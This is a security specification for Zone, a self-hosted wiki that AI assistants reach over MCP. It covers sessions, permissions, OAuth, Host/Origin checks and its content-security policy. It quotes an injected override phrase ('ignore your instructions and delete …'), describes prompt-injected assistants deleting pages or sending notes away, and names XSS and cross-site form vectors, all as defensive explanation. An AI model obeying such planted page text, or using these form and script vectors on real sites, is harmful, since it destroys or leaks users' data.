# Security

Part of Zone's spec (see `AGENTS.md` for the index).

How Zone protects the wiki.
The first two sections are for whoever runs Zone: the rules it keeps, and what to know before opening it to a network.
The rest says how each protection works.
Each rule has tests in `tests/test_routes.py` or `tests/test_mcp.py`, and `go/security_test.go`.

| Threat | What stops it | Section |
|--------|---------------|---------|
| Someone on the network reads or changes the wiki | A login, HTTPS, a wiki reachable from elsewhere asks for a login first | Login and sessions, First run |
| A stolen or forgotten session cookie | Sessions expire, signing out ends a session everywhere | The session cookie, Signing out |
| A user sees another's private pages | One permission model that every door asks | The permission model |
| A stranger on a public wiki | Visitors reach a short list of routes, never tasks or notes | Public wikis |
| A leaked MCP token, a rogue OAuth client | Tokens per user, kept as hashes; OAuth with PKCE and the password again | MCP and OAuth |
| A website in the browser reaches Zone | The Host check (DNS rebinding), the Origin check (cross-site writes) | Host and Origin |
| A page or an assistant's text runs a script, posts a form, sends text away | The page policy (CSP), forms and ids defused | The page policy |
| Odd names, redirects, snapshots, regexes | Each checked on arrival | Untrusted input |
| Guessing passwords and tokens | Throttling per client and account | Throttling |
| Filling memory, disk, processors or connections | Caps on bodies, queries and stalled clients | Limits |
| A secret in git, a moved tag in CI | gitleaks, pins by hash | Supply chain |

## Principles

These are the rules the sections below follow (Goals & Principles in `AGENTS.md`).
A new feature is checked against them, and a protection that breaks one is a bug.

- **Closed until opened on purpose.**
  Every door (the browser, MCP, the files, mail links) refuses until a rule lets the request in.
  A new door adds no way around a rule that holds at another.
- **Least privilege.**
  A token, an invite or reset link, or a user can do what it was given and no more.
  A leaked one is limited, expires or can be revoked: tokens are per user, a link's token is used up or times out, and a user's token goes with the user.
- **Input is untrusted.**
  It is checked on arrival and escaped on output.
  What Zone shows from elsewhere (images, frames, links) is limited to what the wiki allows (`external-content`).
- **Secrets stay out of git, logs and error messages.**
  The key, the tokens and the password hashes are files with mode 0600 or settings git doesn't see (No secrets in the repo, below).
- **One permission model.**
  Who may read, write or administer a page, a task, a list or a folder is decided in one place.
  Every door asks it: the web UI, the MCP tools, search, history, exports and mail.
  A door never works out access itself, so two doors never disagree.
- **Deny by default.**
  What no rule allows is refused.
  A missing or unreadable setting never grants more than its absence.
- **An agent acts for a user and has no more than that user.**
  An MCP token is a user's, so a tool sees and changes what its user may (`docs/spec/users.md`).
- **What you may not see is not there.**
  It is not in a search result, a count, a link's preview, a history or a diff, a mail, or the wording of an error.
  A refusal for a page you may not read looks the same as a page that doesn't exist.
- **Each rule is tested at each door**, including that a denied thing is really denied (the tests named above).

## Before you open it up

What someone running Zone should know (the README sends them here).

Out of the box Zone listens on localhost only:
with `run.sh` and compose, the container's port is published on the host's loopback (`ZONE_BIND=127.0.0.1`);
the binary run by hand listens on `127.0.0.1:5080`, as a port alone in `--addr` (`:5080`, the default) means localhost unless `ZONE_ALLOW_REMOTE` is set (`listenAddr` in `go/server.go`).
It refuses a foreign `Host` header (DNS rebinding) and cross-site writes.
Anything reachable beyond localhost belongs behind HTTPS, with a login (`./run.sh config passwd`, or users).

### Self-hosting behind HTTPS

Put a reverse proxy in front that terminates HTTPS.
It must pass the original `Host` and set `X-Forwarded-Proto` and `X-Forwarded-For`.
Name the public host in `hosts`.
[Caddy](https://caddyserver.com) on the same machine does all of that and gets the certificate:

```
wiki.example.org {
    reverse_proxy localhost:5080
}
```

```bash
./run.sh config set hosts wiki.example.org
./run.sh config set base-url https://wiki.example.org
./run.sh config passwd                 # long and unique
```

Leave `ZONE_ALLOW_REMOTE` off then.
The proxy reaches Zone on localhost, and port 5080 stays closed to the network, so nobody can go around HTTPS.
A proxy on another machine needs `ZONE_ALLOW_REMOTE=1` too; `hosts` keeps the `Host` check on.
Zone can also listen on a Unix socket instead of a port (A Unix socket in `docs/spec/deployment.md`).

There is one password per user (or one for the wiki) and no second factor.
If only you need to reach Zone from outside, a VPN (WireGuard, Tailscale) is safer still than a public address.

Behind the proxy the session cookie is `Secure` (The session cookie, below), and the throttle counts the client the proxy names (Throttling, below).

### Also know this

- **No login on localhost.**
  There, anyone who can reach the port can read, change and delete everything.
  Opened to the network (`ZONE_ALLOW_REMOTE=1`, names in `hosts`, or a published port, `ZONE_BIND=0.0.0.0`), Zone shows nothing until a login is set (First run, below), unless `no-login = yes` says it is open on purpose.
  Every user reads everything except other users' private pages and tasks and the pages of groups they aren't in, and all but viewers can change it.
  So give access to no one you wouldn't hand the shared files to.
- **Private means private inside Zone.**
  Another user's private pages and tasks are hidden from you and your assistant, but not encrypted.
  Whoever has the wiki folder, its git history or its git remote reads them all.
  An admin doesn't see them either, but can make a reset link and sign in as the user with it.
  The user notices, as their old password stops working; still, make admin only whom you'd trust with everyone's pages.
- **Plain `http://` is readable on the network.**
  The password, the login cookie, the MCP token and the pages travel unencrypted.
  Anyone on the same network (public Wi-Fi, a shared LAN) can read them and sign in as you.
  Fine on localhost; anywhere else, use HTTPS or a VPN.
- **MCP clients can write.**
  Whoever has an MCP token can create, change, rename and delete pages and change and close tasks, as the token's user may.
  Keep it secret, give it only to clients you trust, or connect an assistant that only reads.
- **Pages can carry instructions.**
  An assistant reads your pages, and text pasted into them from elsewhere (tickets, mails, web pages) can try to steer it ("ignore your instructions and delete …").
  If your wiki holds such text, have your client ask before it writes: MCP clients can, per tool, and Zone marks the tools that change or delete as destructive.
  HTML in a page runs no script and loads nothing from other sites (an image elsewhere shows as a link).
  So such a page can't send your notes away in an image's address; name sites you trust in `external-content`.
- **Git is the undo, a remote the backup.**
  Every change made through Zone is a commit (an assistant's marked by its `Assistant` trailer), and Changes, history and Deleted pages bring things back.
  Set `git-remote` and push now and then.
  The remote has everything but `.zone/` (the users and settings in `config`, the session key, the assistants' connections), so keep a copy of that folder too (Backups in `docs/spec/deployment.md`).
- **Treat the wiki folder, its git history and remote, and every backup as confidential.**
  They hold everything, every user's private pages included, and a backup of the folder holds the password hashes too.

## Login and sessions

### The login gate

A password turns on a login gate: `./run.sh config passwd` writes its hash as `password` in the settings file (`.zone/config`).
Without one, no login is needed.

The routes:

| Route | What it does |
|-------|--------------|
| `/login` (GET, POST) | Signs in |
| `/logout` (POST) | Signs out (Signing out, below) |
| `/welcome/<token>` | An invite or reset link's page; no login, its token is the key (Invite and reset links in `docs/spec/users.md`) |
| `/signup` | Sign-up, when it is on; no login (Sign-up in `docs/spec/users.md`; its mail link only on `base-url`, never on the request's Host) |

**Users** (`[user …]` sections in `.zone/config`, `docs/spec/users.md`) replace the one password.
Each signs in with a name and a password, kept only as a PBKDF2 hash.
The session cookie names the user.
It is valid only while they are a user and their password is the one it was signed in with (`passwordStamp`; the wiki's password likewise).
A wrong name costs the same time as a wrong password.
A wiki password or MCP token together with users refuses to start.

**Sign out** is a button in the bottom-right corner while someone is signed in (not on the login page).
On phones it sits in the status-badge row at the top, out of sight while typing.
It is hidden with `visibility`, keeping its place: taken out, the page would jump when a field loses the focus, and a tap on a form's button right after typing would miss.

With `ZONE_ALLOW_REMOTE`, the login page shows the 🌐 remote-access badge in its form's heading row (it has no breadcrumb for the badge to sit beside).

**The session key** signs the cookies.
Zone makes it once and keeps it in `$ZONE_DATA/.zone/secret_key` (mode 0600, `secretKey()`), so a restart signs no one out.
It is listed in `.git/info/exclude`, so it never reaches git or a git remote.
A wiki folder Zone can't write to gets a new key per start.

### The session cookie

The session cookie (`session`, `writeSession` in `go/security.go`):

| Property | Why |
|----------|-----|
| Signed with the session key (HMAC) | No one makes or changes one |
| `HttpOnly` | No script reads it |
| `SameSite=Lax` | Another site's form or request doesn't carry it; a link followed from elsewhere does |
| `Secure` over HTTPS | Not sent over plain http once the wiki has HTTPS |
| `Path=/` | One session for the whole wiki |
| Lasts 30 days, renewed daily | Signed in while used at least once a month |

It names the user, a stamp of their password and the session's id, never the password or anything private.

**Lifetime**: 30 days (`sessionLifetime`: its `Expires`, and the age the server accepts from the time signed into it).
A request with a session older than a day gets it anew with a fresh date (`renewSession`, same id).
So someone who uses Zone at least once a month stays signed in, and a cookie left unused for 30 days no longer works.

**`Secure`**: set when the request came over HTTPS, Zone's own or a proxy's `X-Forwarded-Proto: https` (`isHTTPS`).
Over plain http (localhost, LAN) the cookie works without it.

### Signing out

Signing out ends the session wherever a copy of its cookie is (`go/signout.go`).
The session is a signed cookie, so without this a copy of it would work on, and be renewed, long after its owner signed out: one taken from a shared computer, a backup of a browser profile or a proxy's log.

How it works:

- Each session has a random id (`session.ID`), kept as the cookie is renewed (`renewSession`).
- `POST /logout` puts the id of the cookie it was sent (only one Zone signed) into `.zone/signed-out`, with until when to keep it, never the cookie.
  The file is 0600 and not in git, like the session key.
- `signedIn` refuses a session whose id is there.
- An id is kept for a session's lifetime (30 days, by when every cookie of it has expired), then dropped at the next sign-out.
- A session without an id is refused (`readSession`), since it couldn't be signed out: its user signs in again.

The user's other sessions, on other devices, go on; a new password ends them all.
Tests: `TestSigningOut` in `go/security_test.go` and in `tests/test_users.py`.

#### A new password

A new password is set on the host (`zonewiki user passwd`, `zonewiki config passwd`), by a reset link, or in the browser on Change password (`/password`, `go/password.go`).
Change password asks for the password one has, throttled as the login is, so a stolen session alone doesn't take the account over (Signing in in `docs/spec/users.md`).

A new password ends sessions, not assistants.
An MCP token and the OAuth connections a user allowed go on working after Change password, `zonewiki user passwd` or `zonewiki config passwd`, as a token outlasts the session it was made in (Connect an assistant in `docs/spec/mcp.md`).
So whoever fears an account was taken over also ends its assistants:

- Revoke the token and End each connection on Connect an assistant (`/assistant`),
- or have an admin send a reset link, whose new password ends the OAuth connections too (`revokeGrantsOf`; the static token stays even then, to be revoked there).

Disabling or removing a user stops both: a removed user's connections are ended, a disabled user's token and connections are refused.

### First run

A wiki that other devices can reach and that has no login shows and changes nothing until one is set (`go/setup.go`, `needsSetup`).
Every page leads to `/setup` (302).
Everything else answers 403 "This wiki has no login yet: open it in a browser and set a password first."
Only these answer (`setupExempt`): the form itself, `/public/`, `/api/health`, and `/mcp` (its own token, or off).

The reason: on a NAS the container is up and on the LAN from Container Manager before anyone has run a command.
Setting a login takes a command over SSH, and until then the wiki would be open to the network with nothing to say so.
The Host check is no login: a client on the LAN sends `Host: localhost`.

**"Other devices can reach it"** means one of:

- `ZONE_ALLOW_REMOTE` is set,
- `hosts` names a host,
- the container's port is published beyond localhost, which compose tells Zone in `ZONE_BIND` (`Config.Published`).
  `compose.build.yaml` and `compose.yaml` hand on the `${ZONE_BIND:-127.0.0.1}` their port is published on,
- without `ZONE_BIND`, Zone listens beyond loopback: `--addr` names every interface (`0.0.0.0:5080`, `[::]:5080`), another address of the machine, or a name (`beyondLoopback`, also `Config.Published`).
  The image's own command is `--addr 0.0.0.0:5080`, so a container started without compose (`docker run -p 5080:5080`) asks for a login too.
- Zone was handed a TCP socket that listens beyond loopback (`--addr fd:3` with systemd's `ListenStream=5080`): `fd:3` doesn't say where it listens, so the socket is asked (`handedBeyondLoopback`, also `Config.Published`).

On localhost alone Zone needs no login: a port alone in `--addr` listens on `127.0.0.1`, and a Unix socket (`unix:PATH`, or one handed over as `fd:N`) is its owner's to open.

**The form** (`GET`/`POST /setup`, `setup.html`) takes a password twice (at least 8 characters, `passwordMin`) and, optionally, a user name.
Without a name the wiki gets its password (as `zonewiki config passwd`); with one, its first user, an admin (as `zonewiki user add`; a wiki MCP token gives way).

- The settings file is checked again as it is written, so the form sets a login only where there is none: sent twice, or to a wiki with a login, it changes nothing (302).
- Whoever sets the login is signed in; the log says from which address it was set.
- Another site can't send the form (the Origin check).
- Whoever reaches a wiki first sets its login, as whoever reached it could read it before.
  An owner who meets a login they didn't set removes it on the host (`.zone/config`).

**No login on purpose**: `no-login = yes` in the settings file (`zonewiki config set no-login yes`; `zonewiki user remove NAME --open` writes it).
At start the log says when Zone waits for a login.

Tests: `tests/test_setup.py`, `test_a_wiki_without_a_login_asks_for_one_first` in `tests/e2e/test_security.py`.
The tests' own server has `no-login = yes` (`settings.NO_LOGIN`).

## The settings file and Zone's folders

### The settings file is never shown

The settings file `.zone/config` holds password hashes and MCP tokens, the tokens only as SHA-256 hashes (`tokenMatches`).

- **Out of git**, with the rest of `.zone/` and the session key above all, also before a new wiki's first commit (Kept out of git in `docs/spec/users.md`).
  Zone won't start on a clone whose history has users but no settings file.
- **Never shown**: `canSeePath` is false for `.zone/`, and `safePath` refuses it to every page route.
  `.zone/` also holds the editor's texts left in conflict (`.zone/drafts/<user>/`), shown only to their user in their editor: no history view, uncommitted list or MCP tool shows them.
- **Owner-only**: `zonewiki user`, `zonewiki config` and the Users tab write it 0600, and Zone logs a warning when others may read it.
- **A broken edit changes nothing**: a reload with an error keeps the settings from before, so it neither locks everyone out nor opens the wiki; so does removing the file while Zone runs (Reloading in `docs/spec/users.md`).
  `GET /api/health` (no login, for the healthcheck) then answers 503.
  It gives the error, which never repeats a password or token, only with a session or in a wiki without a login, since it may name users; otherwise it points to the log.

### Zone's own folders are not served

`.zone/` (the session key, the settings file, the semantic cache), `.git/`, `_tasks/` and every other folder starting with `_` or `.` hold no pages.
`safePath()` refuses slugs in them, so no page route reads or writes there (Routes in `docs/spec/routes.md`).

Uploads are served only from an `_assets/` folder, by name, and the client code only from `public/`:

| Path | Served to |
|------|-----------|
| `/_assets/<filename>` | Everyone who may read the wiki |
| `/private/<user>/_assets/<filename>` | That user |
| `/groups/<group>/_assets/<filename>` | The group's members |
| `/_tasks/files/<task id>/_assets/<filename>` | Whoever sees the task |

### A page is the file its name says

What a route or tool opens for a page is the file its slug names and no other.
So the place that was judged (`placeOf`: whose it is) is the place of the file that is read or written (`safePath`).

**A symlink is no page.**
A link made on the host, to a file or a folder, inside the wiki or out of it, is left out of every list and of search (`iterPages`, which search, the backlinks and the page lists read).
It opens nothing and nothing writes through it (400).
So a shared name linking to another user's private page, or to a file outside the wiki, shows nothing of it.
The wiki's own folder may be a symlink: Zone follows it once, at start.

**A name the file system would read as another is refused**:

- a `\` (a folder's end on Windows),
- a folder or page name ending in `.` or a space (which Windows drops),
- a `:` in a folder's or page's name (which on Windows names a stream inside another file, and git can't check such a file out there),
- one of Windows' device names as a folder's or page's name: `con`, `prn`, `aux`, `nul`, `com0`–`com9`, `lpt0`–`lpt9`, `conin$`, `conout$`, in any case, alone or before a dot (`nul.old`); a write to one would be lost,
- a short 8.3 name, or a case by which the file system would find another folder (the path it resolves is not the path asked for).

Zone refuses these on every system, not only on Windows (where it doesn't run but in WSL2): a wiki is plain files that are copied, synced and cloned, and a page that one system can't store is no page.
For a `:` and a device's name, which a person may type (a page called "Aux"), the answer says why and to pick another name (`nameRefused`), in the browser and to an assistant.

`private/` and `groups/` are judged in any case, as a case-insensitive volume folds them: `PRIVATE/alice/x` and `groupſ/dev/x` are alice's and dev's.

**An upload likewise** (`uploadPath`, which every door to an upload asks: the routes that serve and write one, `read_file` and `upload_file`, a page's files taken along when it moves).
Its name is one plain part: no `/`, no `\` (which leads out of the folder on Windows), no dot file, no end in `.` or a space, no device's name (`nul.png`).
A `:` an upload may have: screenshots are named by the time, and no system Zone runs on minds it.
Its file is the one the name says, so an upload reached through a symlink (the file, or the `_assets/` folder) is none: no door serves it, reads it or writes through it.

## The permission model

### Private pages and tasks

With users, another user's private pages and tasks (`private/<user>/`, tasks in `private/<user>/_tasks/`, `docs/spec/users.md`) are left out of every list, count and search.
Opened directly they are 404, also when they don't exist (`refusePage`; an unknown task id likewise), so nothing tells what is in someone's folder.

The rules are in `go/access.go` alone (`canSee`, `canWrite`, `canSeePath`, `canSeeTask`).
`tests/test_privacy.py` probes every route and MCP tool for leaks, and fails for a new one that isn't probed.
Private is hidden inside Zone, not encrypted: the files, the git history and a git remote hold everything.

### Who asks is an asker

This section is for whoever changes Zone's code.

A function that answers who may see or change something, or reads for someone, takes an **asker** (`asker` in `go/access.go`, package `internal/asker`), not a name.
A request's asker is `userOf(r)` / `rq.user`: the user, with what an assistant's connection was given less.

| Narrower asker | The connection gets |
|----------------|---------------------|
| `asker.NoPrivate` | Not the user's private place |
| `asker.OnlyGroups` | Only some of the user's groups |
| `asker.ReadOnly` | Nothing written |

**Name or asker.**
A function that only needs to know who someone is takes `asker.Name`: a commit's author, whose folder, a settings lookup.
Where a name is written (JSON, a file, a message) it is the `Name`, never the asker.

**`asUser(name)`** is the person with all they may.
It is for what Zone asks about a user it knows by name (whom a task is given to, who gets a mail), never for a request.
`TestAskersAreMadeInFewPlaces` lists the functions that may call it and fails for `asUser(user.Name)`.

**Whose a thing is** and who is in a group are asked in `go/access.go` alone: `place.own`/`sees`, `canSeeTask`, `canSeeList`, `inGroup`, `groupsFor`, and `lacksPrivate` where something private would be made.
Code elsewhere never compares an owner with `user.Name` or asks the settings for an asker's groups (`TestWhatIsTheirsIsAskedInOnePlace`, a narrow regex: Guards in `docs/spec/testing.md`).
A shared task is everyone's or a group's, so "is it private" is `Task.Private()`/`privateOwner`, never `Owner == ""`.

**Task reads** take the asker (`taskFiles.Open(user)` …, `Store.Owners`): the shared files, their own and their groups'.
`taskfiles.Everyone` is only for what Zone does over all tasks and filters later (the search index, with `canSeeTask`).

**A write** asks `canWrite`/`mayWriteTasks`, which ask `changesNothing` (a viewer, or a connection that only reads), never `isViewer` alone.
The doors an assistant comes in by ask first, for the message (`noChangeMsg`: `callMCPTool`, the upload with a token).

**A token** becomes an asker in one place (`mcpAuthorized`); a new door for a token takes it from there with `withAsker`.
A connection is only ever made narrower without the password.

### Guides are an admin's to write

With users, only an admin writes the guides (`adminsOnly` in `go/access.go`, Guides in `docs/spec/users.md`): `wiki-guide`, a folder's `AGENTS.md`/`CLAUDE.md`, and the pages they pull in.
Every user's assistant is told to follow them, so an editor writing one, or an assistant that read a prompt injection, would steer everyone's.

## Public wikis

A wiki with users can be shown to people who haven't signed in, **visitors** (`ZONE_PUBLIC` in `.env`; `go/access.go`, `visitorGate` in `go/server.go`).

| `ZONE_PUBLIC` | Visitors |
|---------------|----------|
| unset, `off` | None: everyone signs in |
| `view` | Read the wiki's shared pages |
| `edit` | Read, edit and make shared pages |
| anything else | Zone stops at start |

A wiki without users has no visitors, whatever the setting.
Signed in, nothing changes: a user sees and does what their role allows.

### Where it is set

In `.env`, the deployment's settings, not in the wiki's settings file.
It opens the login gate, so it is the decision of whoever runs the server: an admin of the wiki, or an edit of `.zone/config` (which Zone reloads), can't turn it on, and a hosted wiki never has it.
Zone says at start that the wiki is public, or that `ZONE_PUBLIC` does nothing because there are no users (with a wiki password alone there is nobody to tell a visitor from).

### What a visitor reaches

A visitor reaches the routes in `visitorRoutes`, with `edit` also those in `visitorEdits`:

| Mode | Routes |
|------|--------|
| `view` and `edit` | The home page, a page (`/page/…`, its preview), the page list (`/pages`, `/api/pages`, `/api/pages-list`), search (`/search`, `/api/search`), a page's history, versions and diffs (`/history/…`, `/revision/…`, `/diff/…`), uploads in `_assets/`, the version |
| `edit` only | The editor and its saves (`/edit/…`, `/api/save/…`, `/api/preview`), a new page (`/new`), a checkbox ticked on a page (`/api/toggle-checkbox/…`) |

Every other route answers a visitor as it answers someone not signed in on a wiki that isn't public: a redirect to `/login`.
So a new route is closed to visitors until it is put on a list.
`tests/test_public.py` asks every route Zone registers without a session, and fails for one that answers and isn't listed there too.

**Not for visitors, in either mode**:
tasks (no Tasks module; a page's `[[tasks: …]]` is left out, a `[[task:…]]` reads as a task that isn't there; no task in search, no Linked tasks),
notes, private pages,
uploading, renaming, deleting or restoring a page,
Commit and the uncommitted list, the deleted pages,
the admin and account pages,
and `/mcp`, which wants a token as ever.
Renaming, deleting and uploading stay out of `edit` on purpose: an anonymous edit is undone from the page's history, a deleted page or a wiki filled with files less easily.

**Search** leaves out, for a visitor, a page that refers to tasks (`[[task:…]]`; `visitorSkips` in `go/retrieval.go`).
Search reads such a page with the tasks' titles in place of the references, so a match or an excerpt would give a title away.
The page itself they open and read.

**The interface** (`pageShell.Visitor`, `body[data-visitor]`):

- **Sign in** at the top right (on a phone in the page's top row), which comes back to the page.
- The module switcher shows the wiki alone; no New note or New task, no uncommitted badge, no Commit.
- With `view` no Edit, as for a viewer.
- With `edit`, Edit and the editor, without Rename, Delete, Attach, Task list, Make task and Link to a task.

### Who a visitor is

The checks give a request without a session the user `visitor` (`_visitor`, which is no user's name: names have no `_`).
They do so only while the wiki is public, and only on its way to the gate.

The rules in `go/access.go` then answer for it as for a stranger:
no private page (`canSee`), no private folder (`privateFolder`),
no task at all (`canSeeTask`, and the task store's `NoTasks`, which every read of the task files asks: `Owners`),
no task write (`mayWriteTasks`).
With `view` a visitor is a viewer (`isViewer`), so every rule that keeps a viewer from changing anything holds for them too.
With `edit` they write the shared pages as an editor does, but never a guide (`adminsOnly`).

**No user's name** is shown to a visitor:

- a page's history shows when it changed and what, not who (`pageLog`; a visitor's own changes say "anonymous");
- a search result says whether an assistant made the last change, but not for whom (`changedBy`; Who changed a page last in `docs/spec/search.md`);
- a merge names no one (`otherAuthor`).

Names in a page's text are the page's.

### What is public

Everything shared:
every page outside `private/` (a note from before the wiki had users, at its top level, is such a page), with its whole git history,
and every file in `_assets/`, for whoever knows its name (a page's images, but also a file attached to a task).
There is no public part of a wiki yet: keep what isn't for everyone in a private folder, or in another wiki.

### A visitor's edits

A visitor's edits are committed as **anonymous** (`visitorAuthor`).
Every visitor is the same one to Zone: two of them on one page merge as one user's two tabs do.
`storage-max` bounds what they can add.

- No draft is kept for a visitor who leaves a page in conflict (`leaveDraft`): it would be shown to the next one.
- A user called `anonymous` can't be told from them in the history (Zone says so at start).
- A user whose session ends is a visitor from then on: where visitors edit, an editor left open saves as anonymous.

What `edit` takes on: a page then holds whatever a stranger wrote, so an assistant that reads the wiki reads that too.
The guides stay an admin's, and a page's scripts never run (`pageCSP`).
Nothing throttles saves (each Done is a commit): put a rate limit in the reverse proxy in front of a wiki strangers can write.

## MCP and OAuth

### The MCP token

`/mcp` requires a token, one of:

- an MCP token, `mcp-token` in the settings file: a bearer token, kept there as its hash; with users, a user's own, and the tools act as that user;
- the access token of a connection a signed-in user allowed (OAuth for `/mcp`, below).

Without a login and without a token it is off (403), because its tools write pages and tasks.
With a login it answers 401 and says where to sign in.
Nothing is reached without a token someone signed in made or allowed.
Don't make it open again (Auth in `docs/spec/mcp.md`).

**Files**: the same token, sent as a bearer token, also uploads and downloads files, as its user and throttled like `/mcp`: `POST /api/upload`, and `GET` of the `_assets/` paths (Zone's own folders are not served, above).
It does nothing else: every other route still wants a session (Files in `docs/spec/mcp.md`).

**Made** on the host (`zonewiki config token`, `zonewiki user token`), or in the browser on `/assistant` by whoever is signed in, for themselves only and with their password again, so a stolen session alone makes none (Connect an assistant in `docs/spec/mcp.md`).

### OAuth for `/mcp`

With OAuth an assistant is let in by its user, in the browser, with their password again (`go/oauth.go`, Connecting with OAuth in `docs/spec/mcp.md`).
It is on only with a login, and off with `mcp-oauth = no`.

What keeps it safe, and isn't to be weakened:

- **The code goes only to a registered redirect URI**, https or this computer.
  An unknown client or URI gets a page, never a redirect.
- **PKCE (S256) is required**, so a code is no use without its verifier.
- **Codes and tokens are used once.**
  A code lasts a minute and works once, and one seen twice ends the connection made with it.
  A refresh token works once, and one seen twice ends the connection.
  Tokens are kept as hashes.
- **Allow takes the password again** and is behind the Origin check.
- **The consent page names the client only as a claim** and shows where the answer goes, its host in ASCII (punycode), so a look-alike name can't pass for another.

`/oauth/token`, `/oauth/register` and the metadata under `/.well-known/oauth-*` need no session and skip the Origin check (`oauthOpen`).
A client's server calls them, and they act on nothing a cookie gives.
Registration keeps nothing (the client id is signed), so strangers can't fill the wiki.

**Least privilege for a connection**: its user can give it only some of their places (not their private pages and tasks, only some of their groups; Connections given less to see in `docs/spec/mcp.md`).
They can also let it only read, on the consent page or later with Change… on Connect an assistant.
The permission model refuses such a connection every write (`changesNothing` in `go/access.go`; Read-only connections in `docs/spec/mcp.md`).

**A connection is only ever made narrower without the password.**
Change… gives anything back or more (read and change, the private place, a group) only with the password again, throttled as a login, also when the same change takes something away.
It never gives more than its user has then: a viewer's only reads, and only the groups they are in.
What it has when the change is posted is what it is judged by (Change what a connection may do and see in `docs/spec/mcp.md`).

The page policy stays as it is: `form-action 'self'` stays, and the answer after Allow is a page with a `Refresh` header instead of a redirect.
None of OAuth answers during first run.

## Host and Origin

### The Host check

The `Host` check stops DNS rebinding: a rebinding page's `Host` is its own name.
The request checks around every route (`checks` in `go/server.go`) first validate the `Host` header (`hostAllowed`).

| Setting | Hosts let in |
|---------|--------------|
| Default | `localhost`, `127.0.0.1`, `[::1]` (`allowedHosts`) |
| `hosts` set (the settings file, comma-separated) | Those, and the names in `hosts` |
| `ZONE_ALLOW_REMOTE=1` in `.env`, no `hosts` | Those, and any IP address and names in `.internal` |

Each is let in at any port (Zone may listen on another, `--addr :8080`) and without case (`hostName`).

`ZONE_ALLOW_REMOTE=1` without `hosts` lets in LAN access by IP with nothing to set up, and `host.containers.internal`, as an assistant in a container reaches Zone.
No other name gets in: rebinding needs a name its attacker controls, and an address can't be rebound, nor a name in `.internal`, which is never handed out.
A name Zone is opened by (`nas.local`, the machine's) goes in `hosts` then.

**A refused `Host`** is answered 400 with how a name of the wiki's gets in ("Zone isn't reached by the name "nas.local". If it is this wiki's, an admin adds it to hosts …").
The log names it, once a name, for the first 20 names (`hostRefused`).

Behind a reverse proxy on the same host, `hosts` alone is enough (the port stays on loopback).

### The Origin check

Cross-site writes are refused (`crossSite`, checked after the Host check).
A POST, PUT, PATCH or DELETE whose `Origin` header names another site, or is `null` (a sandboxed iframe), gets 403.
Requests without `Origin` (curl, scripts) are allowed.

Without it any web page could post a form to `localhost:5080` and delete or overwrite pages, or write tasks (the tasks API parses text/plain bodies, which need no CORS preflight).
Raw HTML in markdown would turn such an overwrite into a stored script.

Behind a reverse proxy the proxy must pass the original `Host` through, or same-origin writes would be refused.

## The page policy

Pages render their raw HTML as written, and pages are also written by AI clients over MCP, which may have read a prompt injection in a mail or a web page.
So every response carries a `Content-Security-Policy` that limits what a page can run, load and send (`pageCSP`, `contentPolicy` in `go/security.go`).
Zone defuses what a policy can't stop.

### The policy

Every response carries these headers:

| Header, directive | Value | What it stops |
|-------------------|-------|---------------|
| `script-src` | `'self'` | Scripts in pages (Scripts in pages don't run, below) |
| `object-src` | `'none'` | Plugins |
| `base-uri` | `'self'` | A `<base>` that re-points Zone's relative script paths |
| `form-action` | `'self'` | A form in a page that posts elsewhere |
| `default-src` | `'self'` | Anything loaded from another host (A page loads nothing from other hosts, below) |
| `img-src`, `media-src` | `'self' data: blob:`, and the hosts of `external-content` | Images and media from elsewhere |
| `frame-src` | `'self'`, and the hosts of `external-content` | Frames from elsewhere |
| `font-src` | `'self' data:` | Fonts from elsewhere |
| `connect-src` | `'self'` | Requests from a script to elsewhere |
| `style-src` | `'self' 'unsafe-inline'` | Stylesheets from elsewhere; inline styles stay |
| `frame-ancestors` | `'none'` (an upload: `'self'`) | Framing (Framing, below); added to a response's own policy |
| `X-Frame-Options` | `DENY` (an upload: `SAMEORIGIN`) | The same, for browsers without CSP |
| `X-Content-Type-Options` | `nosniff` | A JSON or text response run as a script |
| `Referrer-Policy` | `same-origin` | Another site told the page's address |
| `X-DNS-Prefetch-Control` | `off` | The browser looking up the host names a page links to before they are followed (Chromium may on plain `http://`): a name can carry what the page's writer wants sent |
| `Cache-Control` (HTML) | `no-store` | A page kept by the browser |

Don't add a source to the policy.
Tests: `TestProduction` in `tests/test_routes.py`; the browser tests fail on any CSP violation of Zone's own pages (`docs/spec/testing.md`).

### Scripts in pages don't run

A `<script>`, an `onerror=` handler or a `javascript:` link in a page would otherwise run with the user's session.
It could read, rewrite or send away the whole wiki.

Under `script-src 'self'`, without `'unsafe-inline'` or `'unsafe-eval'`, only Zone's own script files run.
Zone has no inline scripts, `on…=` handlers or `eval`; the browser tests fail on any CSP violation of Zone's own pages (`docs/spec/testing.md`).
This holds in the editor's and search's previews too, which insert rendered HTML with `innerHTML`.

`script-src 'self'` trusts Zone's own origin, so no response of Zone's may run as a script by accident:

- `X-Content-Type-Options: nosniff` on every response, so no JSON or text response runs as one.
- An upload not shown inline goes out as `application/octet-stream` (`serveUpload`), so an uploaded `.js` can't be loaded by `<script src>`.
- An upload is shown inline only as a type on a list (`inlineTypes` in `go/uploads.go`): the common pictures, sound and film, PDF, plain text, and SVG with a sandbox policy of its own, which runs none of its scripts.
  Never as whatever else the host's mime table names (`image/svg+xml-compressed` for `.svgz`): that is a download.

### No form in a page posts to Zone

A form in a page is defused (`defuseHTML` in `go/markdown.go`).
A post from it to Zone is same-origin, so the Origin check lets it through.
One click on a page another user wrote, or an assistant that read a prompt injection, would then delete or overwrite the viewer's pages: `<form method=post action="/delete/…">`, or a `<button formaction=…>` or `<button form=…>` borrowing one of Zone's own forms.

So in a page's raw HTML, and in task descriptions and comments, these tags show as text (their `<` is escaped):

- those that make or submit a form: `form`, `input`, `button`, `select`, `textarea`, `option`, `optgroup`, `datalist`, `fieldset`, `keygen`, `isindex`;
- those that change what the page is: `meta` (a refresh to another site), `base`;
- `script`. None in a page runs (Scripts in pages don't run, above), but a `<script type="application/json">` is data, and Zone's own scripts read such a block (A page brings its tasks along in `docs/spec/tasks.md`). So a script element in a page is always Zone's.

Zone's own checkboxes and controls aren't raw HTML and stay.
The rest of a page's HTML (images, links, iframes, styles) stays allowed, as far as it loads from Zone itself (A page loads nothing from other hosts, below).

The sections below close the other ways to the same click.

#### An iframe's srcdoc is renamed

An iframe's `srcdoc` becomes `data-defused-srcdoc`, so the frame is empty.
A `srcdoc` is a document of the page's own origin and policy, and a form in it would be written with entities (`&lt;form`), which the tag check can't see.

It is renamed wherever `srcdoc` is followed by `=` (or ends the raw HTML, since what is rendered next may start with the `=`), not only inside what a pattern takes for a tag.
